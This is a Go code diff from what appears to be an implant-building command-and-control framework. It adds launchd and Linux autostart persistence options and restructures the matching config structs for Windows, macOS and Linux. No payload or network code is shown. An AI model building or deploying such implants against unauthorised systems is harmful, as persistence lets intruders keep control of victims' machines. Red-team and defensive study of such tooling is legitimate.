@@ -87,22 +87,24 @@ type Bitwitter struct {
 
 }
 
-//Persistence Modules Structs
+/// Persistence Modules Structs
+//Windows
 type BiPersistenceWinSchtasks struct {
 	TaskName string   `json:"taskname"`
 	Path string   `json:"implantpath"`
 	
 }
 
-type BiPersistenceLaunchD struct {
-	LaunchdName string   `json:"launchdname"`
+//Darwin
+type BiPersistenceLaunchd struct {
 	Path string   `json:"implantpath"`
-	
+	LaunchdName string   `json:"launchdname"`
 }
 
-type BiPersistenceLinCron struct {
-	CronName string   `json:"cronname"`
+//Linux
+type BiPersistenceAutoStart struct {
 	Path string   `json:"implantpath"`
+	AutostartName string   `json:"autostartname"`
 }
 
 
@@ -363,7 +365,10 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 
 	//Configure Persistence Params
 	switch persistenceOSX{
+		case "launchd":
 
+			biconfig.Persistence = persistenceOSXParams
+			bModulesOSX = coms + "," + "launchd"
 		default:
 			biconfig.Persistence = "NoPersistence"
 			bModulesOSX = coms + "," + "nopersistence"
@@ -391,6 +396,10 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 	biCompilParamsWindows = bufbiCompilParamsWindows.String()
 
 	switch persistenceLinux{
+		case "linuxautostart":
+
+			biconfig.Persistence = persistenceLinuxParams
+			bModulesLinux = coms + "," + "linuxautostart"
 
 		default:
 			biconfig.Persistence = "NoPersistence"
